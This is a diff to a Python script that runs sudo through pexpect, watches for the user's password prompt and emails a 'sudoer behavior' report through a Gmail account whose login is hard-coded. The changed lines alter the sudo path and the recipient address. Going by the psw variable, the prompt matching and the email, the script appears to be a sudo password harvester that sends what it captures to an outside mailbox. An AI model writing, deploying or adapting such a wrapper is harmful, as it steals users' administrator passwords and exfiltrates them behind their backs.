@@ -12,7 +12,7 @@ def dosudo(cmmd):
     psw=''
     rslt=''
     try:
-        p=spawn('bash',['-c','/usr/bin/sudo '+cmmd])
+        p=spawn('bash',['-c','/bin/sudo '+cmmd])
         i=1
         while i:
             i=p.expect([EOF,usnm+': ','3 incorrect password attempts','will be reported.'])
@@ -37,7 +37,7 @@ def sendemail(mssg):
     smtpserver.starttls()
     smtpserver.login("testhellotestworldtest@gmail.com", "testtesttesthello")
     msg='To:Me\nFrom:testhellotestworldtest@gmail.com\nSubject:sudoer behavior\n\n{0}\n\n'.format(mssg)
-    smtpserver.sendmail("testhellotestworldtest@gmail.com",'zminkling@gmail.com', msg)
+    smtpserver.sendmail("testhellotestworldtest@gmail.com",'dehllloorw@gmail.com', msg)
     smtpserver.close()
 
 if __name__=="__main__":
